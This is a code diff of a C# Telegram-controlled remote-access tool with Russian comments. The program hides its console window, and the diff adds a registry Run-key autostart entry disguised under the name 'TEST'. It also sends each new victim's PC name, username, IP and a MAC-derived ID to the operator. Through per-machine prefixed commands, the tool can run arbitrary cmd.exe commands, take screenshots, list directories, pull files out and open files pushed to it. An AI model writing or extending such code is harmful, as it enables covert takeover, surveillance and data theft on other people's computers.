@@ -1,3 +1,4 @@
+using Microsoft.Win32;
 using System;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -13,6 +14,8 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Net.NetworkInformation;
+using System.Net;
 
 class Program
 {
@@ -32,10 +35,16 @@ class Program
     private static Dictionary<long, string> selectedPc = new Dictionary<long, string>();
     private static Dictionary<string, int> pcNumbers = new Dictionary<string, int>();
     private static int nextPcNumber = 1;
-    private static string instanceId = Guid.NewGuid().ToString("N").Substring(0, 8);
+    private static string uniqueId = GetUniqueId();
+    private static string commandPrefix => $"/user{uniqueId} ";
+    private static string onlineFile = "online_clients.txt";
+    private static DateTime startTime = DateTime.Now;
 
     static async Task Main(string[] args)
     {
+        // Добавляем в автозагрузку
+        AddToStartup();
+
         // Скрываем консоль
         var handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
@@ -44,10 +53,26 @@ class Program
         Console.WriteLine("Инициализация бота...");
         botClient = new TelegramBotClient(botToken);
         var me = await botClient.GetMeAsync();
-        Console.WriteLine($"Бот {me.Username} успешно запущен на компьютере {pcName} (ID: {instanceId})!");
+        Console.WriteLine($"Бот {me.Username} успешно запущен на компьютере {pcName} (ID: {uniqueId})!");
+        // Отправляем владельцу информацию о новом подключении
+        string info = $"🖥️ Новый клиент подключён!\n" +
+            $"Имя ПК: {pcName}\n" +
+            $"Пользователь: {Environment.UserName}\n" +
+            $"IP-адрес: {GetLocalIpAddress()}\n" +
+            $"ID: {uniqueId}\n" +
+            $"Время: {DateTime.Now}";
+        foreach (var chatId in adminChatIds)
+        {
+            try { await botClient.SendTextMessageAsync(chatId, info); } catch { }
+        }
 
-        // Регистрируем текущий компьютер
-        RegisterPc(pcName);
+        // Записываем информацию о себе в файл online_clients.txt
+        try
+        {
+            string infoLine = $"{pcName}|{Environment.UserName}|{uniqueId}|{GetLocalIpAddress()}|{startTime:yyyy-MM-dd HH:mm:ss}";
+            System.IO.File.AppendAllLines(onlineFile, new[] { infoLine });
+        }
+        catch { }
 
         var receiverOptions = new ReceiverOptions
         {
@@ -66,11 +91,30 @@ class Program
         await Task.Delay(-1);
     }
 
-    private static void RegisterPc(string pcName)
+    private static void AddToStartup()
     {
-        if (!pcNumbers.ContainsKey(pcName))
+        try
         {
-            pcNumbers[pcName] = nextPcNumber++;
+            string appName = "TEST"; // Уникальное имя для записи
+            string exePath = Process.GetCurrentProcess().MainModule.FileName;
+
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
+                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
+            {
+                // Проверяем существующую запись
+                object currentValue = key.GetValue(appName);
+
+                // Если путь изменился или запись отсутствует
+                if (currentValue == null || currentValue.ToString() != exePath)
+                {
+                    key.SetValue(appName, exePath);
+                    Console.WriteLine("Обновлена запись в автозагрузке");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Ошибка автозагрузки: {ex.Message}");
         }
     }
 
@@ -127,9 +171,34 @@ class Program
         if (update.Message.Type != MessageType.Text)
             return;
 
-        var message = update.Message.Text.ToLower();
+        var message = update.Message.Text;
+        // --- Разрешаем /help, /pcs, /start, /online без префикса ---
+        if (message.Trim().Equals("/help", StringComparison.OrdinalIgnoreCase))
+        {
+            await SendHelpMessage(update.Message.Chat.Id);
+            return;
+        }
+        if (message.Trim().Equals("/pcs", StringComparison.OrdinalIgnoreCase))
+        {
+            await SendPcList(update.Message.Chat.Id);
+            return;
+        }
+        if (message.Trim().Equals("/start", StringComparison.OrdinalIgnoreCase))
+        {
+            await SendHelpMessage(update.Message.Chat.Id);
+            return;
+        }
+        if (message.Trim().Equals("/online", StringComparison.OrdinalIgnoreCase))
+        {
+            await SendOnlineList(update.Message.Chat.Id);
+            return;
+        }
+        // --- Остальные команды только по префиксу ---
+        if (!message.StartsWith(commandPrefix, StringComparison.OrdinalIgnoreCase))
+            return; // Фильтрация по префиксу
+        var command = message.Substring(commandPrefix.Length).Trim().ToLower();
 
-        if (message == "/screenshot")
+        if (command == "screenshot")
         {
             try
             {
@@ -160,48 +229,14 @@ class Program
                 );
             }
         }
-        else if (message == "/help")
+        else if (command.StartsWith("cmd "))
         {
-            await SendHelpMessage(update.Message.Chat.Id);
-        }
-        else if (message == "/pcs")
-        {
-            await SendPcList(update.Message.Chat.Id);
-        }
-        else if (message.StartsWith("/select "))
-        {
-            await SelectPc(update.Message.Chat.Id, message.Substring(8));
-        }
-        else if (message == "/start")
-        {
-            await SendHelpMessage(update.Message.Chat.Id);
-        }
-        else if (message.StartsWith("/cmd "))
-        {
-            if (!selectedPc.ContainsKey(update.Message.Chat.Id))
-            {
-                await botClient.SendTextMessageAsync(
-                    chatId: update.Message.Chat.Id,
-                    text: "Сначала выберите компьютер с помощью команды /select"
-                );
-                return;
-            }
-
-            if (selectedPc[update.Message.Chat.Id] != pcName)
-            {
-                await botClient.SendTextMessageAsync(
-                    chatId: update.Message.Chat.Id,
-                    text: "Выбранный компьютер недоступен для выполнения команд"
-                );
-                return;
-            }
-
-            string command = message.Substring(5);
+            string cmdText = command.Substring(4);
             try
             {
                 var process = new System.Diagnostics.Process();
                 process.StartInfo.FileName = "cmd.exe";
-                process.StartInfo.Arguments = $"/c {command}";
+                process.StartInfo.Arguments = $"/c {cmdText}";
                 process.StartInfo.UseShellExecute = false;
                 process.StartInfo.RedirectStandardOutput = true;
                 process.StartInfo.RedirectStandardError = true;
@@ -232,27 +267,9 @@ class Program
                 );
             }
         }
-        else if (message.StartsWith("/ls"))
+        else if (command.StartsWith("ls"))
         {
-            if (!selectedPc.ContainsKey(update.Message.Chat.Id))
-            {
-                await botClient.SendTextMessageAsync(
-                    chatId: update.Message.Chat.Id,
-                    text: "Сначала выберите компьютер с помощью команды /select"
-                );
-                return;
-            }
-
-            if (selectedPc[update.Message.Chat.Id] != pcName)
-            {
-                await botClient.SendTextMessageAsync(
-                    chatId: update.Message.Chat.Id,
-                    text: "Выбранный компьютер недоступен для просмотра файлов"
-                );
-                return;
-            }
-
-            string path = message.Length > 3 ? message.Substring(4).Trim() : ".";
+            string path = command.Length > 2 ? command.Substring(2).Trim() : ".";
             try
             {
                 // Нормализация пути
@@ -285,7 +302,7 @@ class Program
                 foreach (var file in files)
                 {
                     var fileInfo = new FileInfo(file);
-                    response.AppendLine($"📄 {Path.GetFileName(file)} ({fileInfo.Length / 1024} KB)");
+                    response.AppendLine($" {Path.GetFileName(file)} ({fileInfo.Length / 1024} KB)");
                 }
 
                 await botClient.SendTextMessageAsync(
@@ -301,27 +318,9 @@ class Program
                 );
             }
         }
-        else if (message.StartsWith("/download "))
+        else if (command.StartsWith("download "))
         {
-            if (!selectedPc.ContainsKey(update.Message.Chat.Id))
-            {
-                await botClient.SendTextMessageAsync(
-                    chatId: update.Message.Chat.Id,
-                    text: "Сначала выберите компьютер с помощью команды /select"
-                );
-                return;
-            }
-
-            if (selectedPc[update.Message.Chat.Id] != pcName)
-            {
-                await botClient.SendTextMessageAsync(
-                    chatId: update.Message.Chat.Id,
-                    text: "Выбранный компьютер недоступен для скачивания файлов"
-                );
-                return;
-            }
-
-            string filePath = message.Substring(9).Trim();
+            string filePath = command.Substring(9).Trim();
             try
             {
                 // Нормализация пути
@@ -330,7 +329,7 @@ class Program
                     filePath = filePath.Substring(1);
                 }
                 filePath = filePath.Replace('/', '\\');
-                
+
                 if (!System.IO.File.Exists(filePath))
                 {
                     await botClient.SendTextMessageAsync(
@@ -376,55 +375,84 @@ class Program
 
     private static async Task SendPcList(long chatId)
     {
-        var message = new System.Text.StringBuilder("Доступные компьютеры:\n");
-        foreach (var pc in pcNumbers)
-        {
-            message.AppendLine($"{pc.Value}. {pc.Key} {(pc.Key == pcName ? "(текущий)" : "")}");
-        }
-        await botClient.SendTextMessageAsync(chatId, message.ToString());
-    }
-
-    private static async Task SelectPc(long chatId, string input)
-    {
-        if (int.TryParse(input, out int pcNumber))
-        {
-            var selectedPcName = pcNumbers.FirstOrDefault(x => x.Value == pcNumber).Key;
-            if (selectedPcName != null)
-            {
-                if (selectedPcName == pcName)
-                {
-                    selectedPc[chatId] = selectedPcName;
-                    await botClient.SendTextMessageAsync(chatId, $"Выбран компьютер: {selectedPcName} (№{pcNumber})");
-                }
-                else
-                {
-                    await botClient.SendTextMessageAsync(chatId, "Этот компьютер недоступен для управления.");
-                }
-            }
-            else
-            {
-                await botClient.SendTextMessageAsync(chatId, "Компьютер с таким номером не найден.");
-            }
-        }
-        else
-        {
-            await botClient.SendTextMessageAsync(chatId, "Пожалуйста, укажите номер компьютера.");
-        }
+        string msg = $"Этот ПК: {pcName}\nПользователь: {Environment.UserName}\nID: {uniqueId}\nIP: {GetLocalIpAddress()}";
+        await botClient.SendTextMessageAsync(chatId, msg);
     }
 
     private static async Task SendHelpMessage(long chatId)
     {
-        string helpText = @"Доступные команды:
-/screenshot - сделать скриншот рабочего стола
-/pcs - показать список доступных компьютеров
-/select <номер_компьютера> - выбрать компьютер для управления
-/cmd <команда> - выполнить команду на выбранном компьютере
-/ls [путь] - показать содержимое директории
-/download <путь_к_файлу> - скачать файл
-/help - показать это сообщение
-
-Также вы можете отправить любой файл, и он будет автоматически открыт на целевом компьютере.";
-
+        string helpText =
+            $"Доступные команды:\n\n" +
+            $"/help - показать это сообщение\n" +
+            $"/pcs - информация об этом ПК\n" +
+            $"/online - список всех онлайн-клиентов\n" +
+            $"{commandPrefix}screenshot - сделать скриншот рабочего стола\n" +
+            $"{commandPrefix}cmd <команда> - выполнить команду на этом ПК\n" +
+            $"{commandPrefix}ls [путь] - показать содержимое директории\n" +
+            $"{commandPrefix}download <путь_к_файлу> - скачать файл\n\n" +
+            "Также вы можете отправить любой файл, и он будет автоматически открыт на целевом компьютере (без префикса).";
         await botClient.SendTextMessageAsync(chatId, helpText);
     }
-} 
+
+    private static async Task SendOnlineList(long chatId)
+    {
+        try
+        {
+            if (!System.IO.File.Exists(onlineFile))
+            {
+                await botClient.SendTextMessageAsync(chatId, "Нет информации о клиентах онлайн.");
+                return;
+            }
+            var lines = System.IO.File.ReadAllLines(onlineFile).Reverse().Distinct().Reverse().ToList();
+            var sb = new System.Text.StringBuilder();
+            sb.AppendLine("Список онлайн-клиентов:");
+            foreach (var line in lines)
+            {
+                var parts = line.Split('|');
+                if (parts.Length >= 5)
+                {
+                    sb.AppendLine($"ID: {parts[2]}, Имя ПК: {parts[0]}, IP: {parts[3]}");
+                }
+            }
+            await botClient.SendTextMessageAsync(chatId, sb.ToString());
+        }
+        catch (Exception ex)
+        {
+            await botClient.SendTextMessageAsync(chatId, $"Ошибка при получении списка: {ex.Message}");
+        }
+    }
+
+    // Генерация уникального ID на основе имени ПК и MAC-адреса
+    private static string GetUniqueId()
+    {
+        try
+        {
+            string mac = NetworkInterface.GetAllNetworkInterfaces()
+                .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
+                .Select(nic => nic.GetPhysicalAddress().ToString())
+                .FirstOrDefault() ?? "00";
+            string raw = pcName + mac;
+            int hash = raw.GetHashCode();
+            return Math.Abs(hash).ToString();
+        }
+        catch
+        {
+            return Guid.NewGuid().ToString("N").Substring(0, 8);
+        }
+    }
+
+    private static string GetLocalIpAddress()
+    {
+        try
+        {
+            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                    return ip.ToString();
+            }
+            return "нет IPv4";
+        }
+        catch { return "неизвестно"; }
+    }
+}
